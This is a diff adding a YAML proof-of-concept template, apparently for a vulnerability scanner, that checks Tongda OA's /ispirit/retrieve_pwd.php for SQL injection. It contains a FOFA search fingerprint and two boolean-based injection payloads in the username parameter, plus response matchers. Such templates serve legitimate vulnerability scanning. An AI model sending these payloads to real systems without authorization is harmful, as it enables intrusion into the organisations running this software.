@@ -1,0 +1,29 @@
+id: poc-yaml-tongda-ispirit-retrieve-pwd-sqli
+info:
+  name: 通达OA /retrieve_pwd.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /ispirit/retrieve_pwd.php?_GET[username]=admin'+or+if((length("hello")=5),1,power(88888,88))+and+'a'%3d'a
+  expression: 'status_code == 200 && (
+
+    contains(gbk_decode(body),`您没有设置`) || contains(body,`您没有设置`) ) && (
+
+    contains(gbk_decode(body),`电子邮件外发默认邮箱`) || contains(body,`电子邮件外发默认邮箱`) ) && (
+
+    contains(gbk_decode(body),`请联系管理员重置密码`) || contains(body,`请联系管理员重置密码`) )
+
+    '
+- method: GET
+  path: /ispirit/retrieve_pwd.php?_GET[username]=admin'+or+if((length("hello")=0),1,power(88888,88))+and+'a'%3d'a
+  expression: "status_code == 200 && (\ncontains(gbk_decode(body),`错误`) || contains(body,`错误`)\
+    \ ) && (\ncontains(gbk_decode(body),`请联系管理员`) || contains(body,`请联系管理员`) ) &&\
+    \ (\ncontains(gbk_decode(body),`文件`) || contains(body,`文件`) ) && \ncontains(body,`/ispirit/retrieve_pwd.php`)\n"
+transport: http
